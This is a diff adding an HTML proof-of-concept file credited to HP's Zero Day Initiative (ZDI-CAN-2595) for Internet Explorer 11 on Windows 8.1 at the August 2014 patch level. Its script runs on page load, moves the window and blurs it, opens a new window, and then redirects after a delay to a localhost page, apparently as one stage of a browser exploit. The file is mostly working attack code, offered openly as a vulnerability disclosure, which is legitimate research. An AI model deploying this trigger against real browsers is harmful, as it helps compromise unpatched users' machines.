@@ -1,0 +1,28 @@
+<!--
+     ZDI-CAN-2595 Control proof of concept
+     HP Zero Day Initiative
+
+ 
+
+     Target: Windows 8.1 / IE11 (32-bit process), August 2014 patch level
+     Run with heap debug flags OFF
+     Recommended 2GB memory minimum
+-->
+<!DOCTYPE html>
+<html>
+<head>
+<title></title>
+<style>
+</style>
+<script type="text/javascript">
+	function redirect(){
+		moveBy(2000,2000);
+		window.blur();
+		window.open();
+		setTimeout('document.location.href="http://localhost:8080/new.html"',7000);
+	}
+</script>
+</head>
+<body onload="redirect();">
+</body>
+</html>
